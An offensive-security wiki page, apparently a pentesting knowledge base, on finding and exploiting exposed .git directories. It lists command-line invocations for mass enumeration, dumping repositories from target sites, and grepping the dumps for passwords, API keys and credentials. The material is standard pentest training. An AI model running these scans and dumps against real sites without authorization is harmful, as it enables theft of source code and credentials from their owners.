---
description: OWASP A3:2017-Sensitive Data Exposure
---

# Exposed Git Repositories

## Theory

The exposure of Git repositories on a webserver often occurs due to misconfigurations, where the `.git` directory is left accessible without proper access controls.&#x20;

If we encounter an application with an exposed .`git` directory, we can retrieve the entire repository. This enables us to extract valuable information, such as the remote repository address, commit history, logs, and various metadata. Accessing these details may reveal sensitive data, including proprietary code, hard-coded API keys, and credentials, which can then be leveraged to escalate our attack and further compromise the application's security.

## Practice

### Enumeration

To detect exposed Git repositories, we can utilize tools and commands below.

{% tabs %}
{% tab title="httpx" %}
We may use [httpx](https://github.com/projectdiscovery/httpx) to identify exposed repositories across a list of domains using the command below. It checks if the `.git/HEAD` file contains `refs/heads` .

Note that this one-liner will only identify repositories if directory listing is enabled.

```bash
cat domains.txt | httpx -path /.git/HEAD -silent -mr "refs/heads"
```
{% endtab %}

{% tab title="Feroxbuster" %}
When performing web directory fuzzing on a target with [Feroxbuster](https://github.com/epi052/feroxbuster) or any other tool, using the [common.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt) wordlist from [SecLists](https://github.com/danielmiessler/SecLists) can help uncover any exposed `.git` directories.

```bash
feroxbuster -u http://target.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```
{% endtab %}

{% tab title="Google Dorks" %}
We can use the Google search engine to search for exposed `.git` repository with the following [Google Dorks](exposed-git-repositories.md#google-dorks)

```bash
intext:"index of" ".git"
{intitle: indexof/.git }
intitle:"index of" "/.git/config"
filetype:git -github.com inurl:"/.git"
```
{% endtab %}

{% tab title="Gitfinder" %}
This python script from [GitTools](https://github.com/internetwache/GitTools) identifies websites with publicly accessible `.git` repositories from a list of domains. It checks if the `.git/HEAD` file contains `refs/heads`.

```
./gitfinder.py -i domains.txt
```
{% endtab %}
{% endtabs %}

### Dump&#x20;

Once an exposed Git repository is identified, the next step is to perform a repository dump to extract its contents.

{% tabs %}
{% tab title="GitTools" %}
**gitdumper** from [GitTools](https://github.com/internetwache/GitTools) can be used to download as much as possible from the found .git repository from webservers which do not have directory listing enabled.

```
./gitdumper.sh http://target.com/.git/ dest-dir
```

**extractor.sh** from [GitTools](https://github.com/internetwache/GitTools) can then be used in combination with **gitdumper** in case the downloaded repository is incomplete. This tool extract commits and their content from a broken repository.

```
./extractor.sh /tmp/mygitrepo /tmp/mygitrepodump
```
{% endtab %}

{% tab title="GitHacker" %}
[GitHacker](https://github.com/WangYihang/GitHacker) (Python) is a multiple threads tool to exploit the `.git` folder leakage vulnerability.

```bash
# quick start
githacker --url http://127.0.0.1/.git/ --output-folder result
# brute for the name of branchs / tags
githacker --brute --url http://127.0.0.1/.git/ --output-folder result
# exploit multiple websites, one site per line
githacker --brute --url-file websites.txt --output-folder result
```
{% endtab %}

{% tab title="goop" %}
[goop](https://github.com/nyancrimew/goop) (Golang) is tool to dump a git repository from a website.

```bash
goop target.com
```
{% endtab %}

{% tab title="git-dumper" %}
[git-dumper](https://github.com/arthaud/git-dumper) (python) is a tool to dump a git repository from a website.

```bash
git-dumper http://target.com/.git ~/TargetOutputFolder
```
{% endtab %}
{% endtabs %}

### Hunting

After successfully dumping an exposed Git repository, the next step is to hunt for valuable secrets within the retrieved data.

{% tabs %}
{% tab title="Hard-coded Secrets" %}
#### Noseyparker

[Noseyparker](https://github.com/praetorian-inc/noseyparker) is a command-line program that finds secrets and sensitive information in textual data and Git history. We can use this tool to recursively search sensitive information in a repository.

```bash
# Scan filesystem / folder
noseyparker scan --datastore np.myDataStore /path/to/gitRepo

# Get results
noseyparker report -d np.myDataStore
```

{% hint style="info" %}
You may use this tools to search sensitives files in a [mounted NFS share](../../../network/protocols/nfs.md#mount-nfs-shares), a [mounted SMB share](../../../network/protocols/smb.md#acls-of-shares-file-folder), or even [exiltrated data](../../../redteam/exfiltration/).
{% endhint %}

#### Bash

Alternatively, `find` command can be use to find configuration files by recursively searching files with a specific extension or name and the grep command can be use to find passwords in files by recursively searching text patterns.

```bash
# Search for patterns in file
grep -ari 'password'
grep -ari 'api_key'
grep -ari 'api_key'

# Search for configuration/sensitive files
find / -type f -name *.conf 2>/dev/null
find / -type f -name *pass* 2>/dev/null
```
{% endtab %}

{% tab title="Origin" %}
Sometimes, we can find HTTP credential in the remote repository URL&#x20;

```bash
git config --get remote.origin.url
```
{% endtab %}

{% tab title="Commit History" %}
Even if  [Noseyparker](https://github.com/praetorian-inc/noseyparker) can do it for us, we may manually search for sensitive informations in previous commits.

```bash
# Get list of commits
git log

# Get list of commits as a graph
git reflog

# Get list of commit filtred by authors
git log --author="John Doe"

# Check code change over two commits
git diff <FISRT_COMMIT_ID> <SECOND_COMMIT_ID>

# Checkout on a specific commit
git checkout <COMMIT_ID>

# Finally hunt for secrets on this new commit
cat secrets.txt
grep -ari 'password'
....
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" %}

{% embed url="https://medium.com/stolabs/git-exposed-how-to-identify-and-exploit-62df3c165c37" %}

{% embed url="https://infosecwriteups.com/exposed-git-directory-exploitation-3e30481e8d75" %}
